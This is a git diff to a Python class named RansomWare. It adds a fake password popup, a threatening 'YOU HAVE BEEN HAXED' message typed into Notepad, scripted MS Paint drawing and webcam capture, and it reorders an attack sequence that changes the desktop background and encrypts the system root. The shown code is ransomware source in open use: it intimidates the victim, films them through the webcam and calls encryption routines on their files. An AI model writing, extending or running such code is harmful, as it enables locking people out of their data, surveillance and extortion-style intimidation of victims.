@@ -10,6 +10,7 @@ import tkinter as tk
 import cv2
 import signal
 import time
+import pyautogui
 
 # File exstensions to seek out and Encrypt
 """
@@ -43,10 +44,12 @@ class RansomWare:
 
     def start_attack(self):
         try:
+            self.popup()
             self.open_browser()
+            self.paint()
+            self.take_picture()
             self.change_desktop_background()
             self.encryptSystem()
-            self.take_picture()
         except Exception as error:
             print(error)
 
@@ -71,24 +74,73 @@ class RansomWare:
             encryptor.decryptDirectory(self.sysRoot, extensions)
             os.remove(".encrypted")
 
-    def take_picture(self):
+    def popup(self):
+        screenWidth, screenHeight = pyautogui.size()
+        currentMouseX, currentMouseY = pyautogui.position()
+        notepad = "C:\WINDOWS\system32\\notepad.exe"
 
+        pw = pyautogui.password(
+            "To save your computer enter the correct password", mask="*")
+        if(pw == "help"):
+            pyautogui.alert('CONGRATS YOU GOT IT RIGHT', "HAXED")
+            pyautogui.alert(" Okay, Bye 👋 ", "HAXED")
+            quit()
+        else:
+            pyautogui.alert('SORRY BUT THAT JUST WONT DO', "HAXED")
+            os.startfile(notepad)
+            time.sleep(2)
+            pyautogui.write(f"""
+YOU HAVE BEEN HAXED
+
+Listen we know it sucks but thanks for letting us in.... 
+as you are busy reading this you are being locked out of your files.... 
+There is no way for you to stop us. 
+
+Much like the proverbial vampire once you invited us in we are free to come and go as we please.
+
+Make Better Choices
+We can take your picture
+
+We can see your history... no incognito mode doesn't stop us
+
+We know your passwords! 
+
+And most importantly we know you!!!
+
+            """, interval=0.05)
+
+    def paint(self):
+        paint_path = "C:\WINDOWS\system32\mspaint.exe"
+        os.startfile(paint_path)
+        # wait for paint to start
+        time.sleep(2)
+
+        distance = 200
+        while distance > 0:
+            pyautogui.drag(distance, 0, duration=0.15)   # move right
+            distance -= 10
+            pyautogui.drag(0, distance, duration=0.15)   # move down
+            pyautogui.drag(-distance, 0, duration=0.15)  # move left
+            distance -= 10
+            pyautogui.drag(0, -distance, duration=0.15)
+
+    def take_picture(self):
         try:
             self.attemps += 1
             vid = cv2.VideoCapture(1)
             while self.attemps < 5:
                 ret, frame = vid.read()
-                cv2.imshow('frame', frame)
+                cv2.imshow('👁 see you', frame)
                 if cv2.waitKey(1) & 0xFF == ord('q'):
                     break
 
             vid.release()
             cv2.destroyAllWindows()
-            
-            if self.attemps < 5:
+
+            if self.attemps < 2:
                 time.sleep(2)
                 self.take_picture()
-                
+
         except Exception as err:
             print(err)
 
